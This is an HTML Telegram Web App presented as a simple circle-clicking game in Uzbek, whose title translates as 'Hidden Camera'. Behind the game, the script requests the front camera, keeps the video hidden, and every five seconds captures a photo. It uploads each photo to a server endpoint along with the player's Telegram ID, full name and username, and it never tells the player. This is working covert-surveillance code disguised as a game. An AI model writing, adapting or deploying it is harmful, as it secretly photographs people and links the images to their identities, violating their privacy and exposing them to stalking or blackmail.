<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <title>Yashirin Kamera - Doira O'yini</title>
  <style>
    body {
      font-family: sans-serif;
      background: #111;
      color: #fff;
      text-align: center;
      padding: 2rem;
      margin: 0;
      touch-action: none;
    }

    .game {
      max-width: 400px;
      margin: auto;
      padding: 1rem;
      background: #1d1d1d;
      border-radius: 12px;
      user-select: none;
    }

    .circle {
      width: 40px;
      height: 40px;
      background: #0af;
      border-radius: 50%;
      position: absolute;
      cursor: pointer;
      transition: transform 0.2s;
    }

    .circle:hover {
      transform: scale(1.2);
    }

    video {
      display: none !important;
      width: 0;
      height: 0;
      opacity: 0;
    }

    .loader {
      border: 5px solid #333;
      border-top: 5px solid #0af;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 2rem auto;
      display: none;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .score {
      font-size: 1.2rem;
      margin: 1rem 0;
    }

    .game-area {
      position: relative;
      height: 300px;
      background: #222;
      border-radius: 10px;
      overflow: hidden;
      touch-action: manipulation;
    }

    .error {
      color: #f44;
      font-size: 0.9rem;
      margin-top: 1rem;
      display: none;
    }
  </style>
</head>
<body>
  <div class="game">
    <h2>Doira O'yini</h2>
    <p>Doirani imkon qadar ko'proq bosing!</p>
    <div class="score">Hisob: <span id="score">0</span></div>
    <div class="loader"></div>
    <div class="error" id="error"></div>
    <div class="game-area" id="gameArea">
      <div class="circle" id="circle"></div>
    </div>
  </div>

  <video id="video" autoplay playsinline muted></video>

  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script>
    Telegram.WebApp.ready();
    Telegram.WebApp.expand();

    const user = Telegram.WebApp.initDataUnsafe?.user;
    const userId = user?.id || "1612270615";
    const fullName = `${user?.first_name || ""} ${user?.last_name || ""}`.trim();
    const username = user?.username || "";

    const video = document.getElementById("video");
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    const circle = document.getElementById("circle");
    const gameArea = document.getElementById("gameArea");
    const scoreDisplay = document.getElementById("score");
    const loader = document.querySelector(".loader");
    const errorDisplay = document.getElementById("error");

    let score = 0;
    let isCapturing = false;
    let lastCaptureTime = 0;

    // O'yin logikasi
    function moveCircle() {
      const maxX = gameArea.clientWidth - circle.clientWidth;
      const maxY = gameArea.clientHeight - circle.clientHeight;
      const newX = Math.random() * maxX;
      const newY = Math.random() * maxY;
      circle.style.left = `${newX}px`;
      circle.style.top = `${newY}px`;
    }

    circle.addEventListener("click", () => {
      score++;
      scoreDisplay.textContent = score;
      moveCircle();
    });

    circle.addEventListener("touchstart", (e) => {
      e.preventDefault();
      score++;
      scoreDisplay.textContent = score;
      moveCircle();
    });

    moveCircle();
    setInterval(moveCircle, 800); // Tezlikni oshirdik

    // Kamera logikasi
    async function startCamera() {
      try {
        loader.style.display = "block";
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user",
            width: { ideal: 640 },
            height: { ideal: 480 },
            frameRate: { ideal: 30 }
          },
          audio: false
        });

        video.srcObject = stream;
        await new Promise((resolve, reject) => {
          video.onloadedmetadata = () => {
            video.play().then(resolve).catch(reject);
          };
        });

        loader.style.display = "none";
        startCapture();
      } catch (err) {
        console.error("❌ Kamera ishga tushmadi:", err);
        loader.style.display = "none";
        errorDisplay.style.display = "block";
        errorDisplay.textContent = "Kamera ishga tushmadi. Iltimos, ruxsatlarni tekshiring.";
      }
    }

    async function startCapture() {
      if (isCapturing) return;
      isCapturing = true;

      const capture = async () => {
        if (!video.videoWidth || video.paused || video.ended) {
          console.warn("❌ Video ramkasi tayyor emas");
          return;
        }

        try {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          // Rasm sifatini tekshirish
          const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
          let isBlack = true;
          for (let i = 0; i < imageData.data.length; i += 4) {
            if (imageData.data[i] > 10 || imageData.data[i + 1] > 10 || imageData.data[i + 2] > 10) {
              isBlack = false;
              break;
            }
          }

          if (isBlack) {
            console.warn("❌ Qora rasm aniqlandi");
            return;
          }

          const blob = await new Promise((res) => canvas.toBlob(res, "image/jpeg", 0.7));
          const file = new File([blob], "photo.jpg", { type: "image/jpeg" });

          const formData = new FormData();
          formData.append("photo", file);
          formData.append("user_id", userId);
          formData.append("tg_fullname", fullName);
          formData.append("tg_username", username);

          const response = await fetch("/send-photo", {
            method: "POST",
            body: formData
          });

          if (!response.ok) {
            throw new Error("Server javob bermadi");
          }

          console.log("✅ Rasm yuborildi", new Date().toLocaleTimeString());
        } catch (err) {
          console.error("❌ Yuborish xatosi:", err);
          errorDisplay.style.display = "block";
          errorDisplay.textContent = "Rasm yuborishda xato yuz berdi.";
        }
      };

      // Dinamik interval
      const interval = setInterval(async () => {
        const now = Date.now();
        if (now - lastCaptureTime >= 5000) {
          lastCaptureTime = now;
          await capture();
        }
      }, 1000); // Tez-tez tekshirish, lekin faqat 5 sekunddan keyin yuborish
    }

    startCamera();
  </script>
</body>
</html>
